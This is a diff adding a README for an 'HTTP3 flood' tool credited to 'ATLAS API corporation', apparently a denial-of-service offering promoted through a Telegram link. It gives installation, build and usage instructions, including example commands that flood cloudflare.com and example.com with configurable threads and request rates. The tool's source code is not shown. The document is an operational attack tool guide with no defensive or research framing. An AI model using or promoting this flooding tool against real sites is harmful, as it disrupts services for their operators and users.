@@ -1,0 +1,28 @@
+- ATLAS API corporation -
+
+HTTP3 flood
+(not proxied)
+
+Made by Benshii Varga
+https://t.me/atlasapi
+
+- Requirements -
+go version 1.21.6
+
+- Installation -
+sudo apt-get update
+sudo snap install go --classic
+go mod init HTTP3
+go mod tidy
+go get
+
+- Compiling -
+go build HTTP3.go
+
+- Usage -
+./HTTP3 -h
+./HTTP3 -url <url> -time <time> -threads <threads> -rps (optional: -debug -rand)
+
+- Example -
+./HTTP3 -url https://cloudflare.com -time 120 -threads 5 -rps 32 -debug
+./HTTP3 -url https://example.com -time 60 -threads 10 -rps 64 -rand
